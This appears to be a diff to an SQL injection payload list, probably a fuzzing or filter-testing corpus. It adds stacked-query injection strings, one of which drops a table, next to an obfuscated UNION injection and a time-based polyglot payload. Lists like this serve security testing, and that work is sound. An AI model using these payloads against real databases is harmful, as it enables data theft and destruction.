@@ -380,3 +380,12 @@ users.id%0D%0A%23asd%0D%0Aunion%0D%0A%23asd%0D%0Aselect%0D%0A%23asd%0D%0A--a-%0D
 
 # http://blog.detectify.com/post/51651525114/the-ultimate-sql-injection-payload
 IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/
+
+# misc secondary sql statements
+1 and true; BEGIN DECLARE @xy varchar(8000)
+1; BEGIN DECLARE @xy varchar(8000)
+x' and 1 = 0; BEGIN DECLARE
+x' AND 1=0; DROP TABLE TMP_DB;
+' AND 1=0; DECLARE @S VARCHAR(4000) SET @S
+
+' IF EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.TABLES WHERE 
